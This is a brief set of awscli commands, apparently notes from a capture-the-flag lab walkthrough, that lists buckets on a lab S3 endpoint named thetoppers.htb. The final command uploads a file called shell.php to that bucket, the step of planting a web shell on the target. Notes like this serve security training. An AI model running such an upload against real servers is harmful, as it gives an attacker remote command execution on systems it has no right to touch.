## awscli

```sh
sudo apt install awscli
```

```sh
aws configure

aws s3 ls

"Choose all as temp"

aws --endpoint=http://s3.thetoppers.htb s3 ls

aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb

aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb


```